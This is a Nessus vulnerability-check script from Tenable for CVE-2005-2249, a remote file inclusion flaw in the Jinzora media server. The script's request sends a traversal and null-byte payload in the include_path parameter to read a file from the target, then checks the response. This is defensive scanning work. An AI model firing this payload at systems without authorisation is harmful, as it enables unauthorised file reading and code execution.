#
# (C) Tenable Network Security
#



include("compat.inc");

if (description) {
  script_id(18653);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-2249");
  script_bugtraq_id(14188);
  script_xref(name:"OSVDB", value:"17736");

  script_name(english:"Jinzora Multiple Script include_path Parameter Remote File Inclusion (2)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple remote file include issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Jinzora, a web-based media streaming and
management system written in PHP. 

The installed version of Jinzora allows remote attackers to control
the 'include_path' variable used when including PHP code in several of
the application's scripts.  Provided PHP's 'register_globals' setting
is enabled, an attacker may be able to leverage these issues to view
arbitrary files on the remote host and execute arbitrary PHP code,
possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://freshmeat.net/projects/jinzora/?branch_id=43140&release_id=204535" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Jinzora version 2.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_summary(english:"Checks for include_path variable file include vulnerabilities in Jinzora");
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories (catch CMS installs too).
foreach dir (make_list(cgi_dirs(), "/modules/jinzora")) {
  # Try to exploit one of the flaws to read a file from the distribution.
  req = http_get(
    item:string(
      dir, "/backend/classes.php?",
      "include_path=../lib/jinzora.js%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # we get the file itself or...
    "function mediaPopupFromSelect" >< res ||
    # we get an error saying "failed to open stream".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(.+/jinzora\.js.+failed to open stream")
  ) {
    security_warning(port);
    exit(0);
  }
}
